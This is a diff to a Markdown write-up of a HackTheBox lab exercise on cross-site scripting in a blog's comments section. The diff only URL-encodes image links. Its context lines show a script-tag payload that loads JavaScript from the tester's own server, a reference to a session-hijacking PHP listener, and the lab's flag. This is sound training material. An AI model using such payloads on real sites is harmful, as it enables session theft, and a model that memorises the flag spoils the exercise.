@@ -21,11 +21,11 @@ Apply the skills you learned in this module to achieve the following:
 
 Once we go into the website we can see the following:
 
-![](Pasted image 20250130180314.png)
+![](Pasted%20image%2020250130180314.png)
 
 If we go to the `Welcome to Security Blog` URL, we can see the following:
 
-![](Pasted image 20250130180344.png)
+![](Pasted%20image%2020250130180344.png)
 
 At first glance, the comments section seems vulnerable to XSS, let's test some simple payload to check the behavior of the web application, we can set up the same PHP server form the [[CYBERSECURITY/Bug Bounty/HTB BUG BOUNTY HUNTER PATH/CROSS-SITE SCRIPTING (XSS)/XSS Attacks/Session Hijacking.md|Session Hijacking]] section:
 
@@ -54,7 +54,7 @@ We can send the payloads in each section to check which one is vulnerable:
 "><script src=http://10.10.15.141/script.js></script>
 ```
 
-![](Pasted image 20250130181138.png)
+![](Pasted%20image%2020250130181138.png)
 
 After a bit, we'll get the following in our server:
 
@@ -73,5 +73,5 @@ After a bit, we'll get the following in our server:
 
 We got the flag: `HTB{cr055_5173_5cr1p71n6_n1nj4}`
 
-![](Pasted image 20250130181248.png)
+![](Pasted%20image%2020250130181248.png)
 
